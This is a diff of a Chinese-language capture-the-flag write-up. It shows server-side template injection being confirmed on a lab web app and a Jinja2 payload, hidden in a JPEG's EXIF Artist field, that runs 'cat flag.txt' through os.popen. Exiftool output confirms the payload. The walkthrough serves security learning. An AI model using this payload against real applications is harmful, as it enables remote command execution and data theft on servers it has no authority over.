@@ -40,12 +40,12 @@ convert -size 100x100 xc:white image.jpg
 ### SSTI
 嘗試 SSTI 先輸入簡單的 `{{1+1}}`
 1. `http://94.237.49.90:46665/profile`
-![alt text](image-3.png)
+![alt text](image-3.png)  
 profile 沒有成功反射 2
 
 
 2. `http://94.237.49.90:46665/user/amy`
-![alt text](image-2.png)
+![alt text](image-2.png)  
 user link 成功反射 2 ！！！
 
 確認後端程式後
@@ -249,6 +249,34 @@ def verify():
 └─$ exiftool -overwrite_original -artist="{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}" image1.jpg 
 
     1 image files updated
+
+┌──(kali㉿kali)-[~/ctf/guild]
+└─$ exiftool image1.jpg
+ExifTool Version Number         : 13.25
+File Name                       : image1.jpg
+Directory                       : .
+File Size                       : 403 bytes
+File Modification Date/Time     : 2025:11:04 12:12:12+08:00
+File Access Date/Time           : 2025:11:04 12:12:12+08:00
+File Inode Change Date/Time     : 2025:11:04 12:12:12+08:00
+File Permissions                : -rw-rw-r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Exif Byte Order                 : Big-endian (Motorola, MM)
+X Resolution                    : 1
+Y Resolution                    : 1
+Resolution Unit                 : None
+Artist                          : {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}
+Y Cb Cr Positioning             : Centered
+Image Width                     : 100
+Image Height                    : 100
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 1
+Image Size                      : 100x100
+Megapixels                      : 0.010
 
 ```
 用 amy1 的 cookie 上傳新圖片
